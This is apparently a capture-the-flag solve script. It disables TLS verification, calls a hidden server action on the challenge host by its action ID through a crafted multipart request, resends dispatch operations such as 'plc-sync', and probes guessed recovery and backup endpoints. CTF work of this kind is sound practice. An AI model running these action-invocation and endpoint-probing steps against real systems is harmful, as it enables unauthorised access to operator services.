#!/usr/bin/env python3
"""
After invoking the recovery action, test if the dispatch API now responds.
Also check if any other endpoints become available.
"""
import urllib.request, urllib.error, ssl, json, http.cookiejar, time

BASE = "https://funicular-gm2cxozn.alfactf.ru"
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPSHandler(context=ctx),
    urllib.request.HTTPCookieProcessor(jar),
)


def req(method, path, headers=None, body=None):
    r = urllib.request.Request(BASE + path, data=body, method=method, headers=headers or {})
    try:
        with opener.open(r, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def multipart(fields):
    boundary = "----X1234ABC"
    parts = []
    for k, v in fields:
        parts.append(f"--{boundary}\r\n".encode())
        parts.append(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode())
        parts.append(v.encode() if isinstance(v, str) else v)
        parts.append(b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    return boundary, b"".join(parts)


# 1) Initial GET
s, h, d = req("GET", "/")
print("initial GET:", s, "cookies:", [c.name + "=" + c.value[:8] for c in jar])

# 2) plc-sync BEFORE action (baseline)
payload = json.dumps({"operation": "plc-sync", "packet": "south-line.2026-03-27", "workOrder": "WO-17-04", "terminal": "ОП-3"}).encode()
s, h, d = req("POST", "/api/operator/dispatch", {"Content-Type": "application/json"}, payload)
print(f"\nBEFORE plc-sync: {s} {d[:300]}")

# 3) Invoke recovery action via MPA
boundary, body = multipart([(f"$ACTION_ID_{ACTION_ID}", "")])
s, h, d = req("POST", "/", {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
print(f"\nMPA action: {s}, len={len(d)}")
print("cookies after MPA:", [c.name + "=" + c.value[:8] for c in jar])

# 4) plc-sync AFTER action
for op in ("plc-sync", "telemetry-snapshot", "maintenance-preview"):
    payload = json.dumps({"operation": op, "packet": "south-line.2026-03-27", "workOrder": "WO-17-04", "terminal": "ОП-3"}).encode()
    s, h, d = req("POST", "/api/operator/dispatch", {"Content-Type": "application/json"}, payload)
    print(f"\nAFTER {op}: {s} {d[:400].decode('utf-8','replace')}")

# 5) Probe other endpoints possibly enabled
for p in ("/api/operator/recovery", "/api/operator/restore", "/api/operator/backup", "/api/recovery", "/api/restore", "/api/backup", "/recovery", "/restore", "/backup", "/api/operator/status", "/api/status"):
    s, h, d = req("GET", p)
    if s != 404:
        print(f"\nGET {p}: {s} len={len(d)} body[:300]: {d[:300].decode('utf-8','replace')}")
